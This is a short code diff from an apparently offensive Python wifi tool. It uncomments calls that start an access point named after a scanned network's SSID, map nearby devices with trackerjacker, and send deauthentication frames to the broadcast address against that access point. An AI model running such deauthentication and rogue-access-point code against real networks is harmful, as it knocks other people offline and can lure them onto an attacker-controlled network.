@@ -147,15 +147,10 @@ if __name__ == "__main__":
     ap = apRescanHandler(apDevice)
     ssid = ap[0]
     addr = ap[1]
-
+    startAP(ssid, apDevice)
     os.system("rm wifi_map.yaml")
     os.system('trackerjacker -i ' + apDevice + ' --map')
     printDevices(ssid)
-
-    # print(type(addr))
-    # startAP(ssid, apDevice)
-    # brdmac = "ff:ff:ff:ff:ff:ff"
-    # deauth(brdmac, addr)
-
-    # printDevices("Casa")
+    brdmac = "ff:ff:ff:ff:ff:ff"
+    deauth(brdmac, addr)
     stopAttack()
